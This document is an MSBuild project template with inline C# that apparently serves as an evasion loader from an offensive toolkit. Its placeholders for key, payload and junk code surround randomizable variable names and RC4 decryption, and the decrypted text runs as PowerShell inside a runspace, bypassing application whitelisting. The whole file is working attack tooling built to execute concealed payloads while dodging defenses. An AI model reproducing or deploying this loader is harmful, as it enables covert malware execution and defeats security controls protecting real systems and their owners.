<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="VAR1"[CONDITION]>
   <VAR1 />
   <VAR2 />
   </Target>
  <UsingTask
    TaskName="VAR1"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
	  <Using Namespace="System.IO" />
      <Code Type="Fragment" Language="cs">
      </Code>
    </Task>
	</UsingTask>
	<UsingTask
    TaskName="VAR2"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	  <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
		using System;
		using System.IO;
		using System.Text;
		using System.Management.Automation;
		using System.Collections.Generic;
		using System.Collections.ObjectModel;
		using Microsoft.Build.Utilities;
		using Microsoft.Build.Framework;
		using System.Management.Automation.Runspaces;
		
		public class VAR2 :  Task, ITask {	
			public override bool Execute() {
[JUNK1]
				byte[] VAR9 = {[KEY]};
				Runspace VAR4 = RunspaceFactory.CreateRunspace();
				VAR4.Open();
				RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
[JUNK2]
				Pipeline VAR12 = VAR4.CreatePipeline();
				string VAR8 = VAR60.VAR61("[PAYLOAD]");

				byte[] VAR10 = Convert.FromBase64String(VAR8);
				string VAR11 = Encoding.UTF8.GetString(VAR16.VAR28(VAR9, VAR10));

				VAR12.Commands.AddScript(VAR11);
				VAR12.Commands.Add("Out-String");
[JUNK3]
				Collection<PSObject> VAR13 = VAR12.Invoke();
				VAR4.Close();

				StringBuilder VAR14 = new StringBuilder();
				foreach(PSObject VAR15 in VAR13) {
					VAR14.AppendLine(VAR15.ToString());
				}
				Console.Write(VAR14.ToString());
				return true;
			}
		}
		
		public class VAR60 {
			public static string VAR61(string VAR62) {
				string VAR63 = "[PATTERN_1]";
				string VAR64 = "[PATTERN_2]";
				return VAR62.Replace(VAR63, "m").Replace(VAR64, "V");
			}
		}

		public class VAR16 {
			public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
				int VAR20, VAR21, VAR22, VAR23, VAR24;
				int[] VAR25, VAR26;
				byte[] VAR27;

				VAR25 = new int[256];
				VAR26 = new int[256];
				VAR27 = new byte[VAR19.Length];

				for (VAR21 = 0; VAR21 < 256; VAR21++) {
					VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
					VAR26[VAR21] = VAR21;
				}
				for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
					VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
					VAR24 = VAR26[VAR21];
					VAR26[VAR21] = VAR26[VAR22];
					VAR26[VAR22] = VAR24;
				}
				for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
					VAR20++;
					VAR20 %= 256;
					VAR22 += VAR26[VAR20];
					VAR22 %= 256;
					VAR24 = VAR26[VAR20];
					VAR26[VAR20] = VAR26[VAR22];
					VAR26[VAR22] = VAR24;
					VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
					VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
				}
				return VAR27;
			}

			public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
				return VAR17(VAR29, VAR30);
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
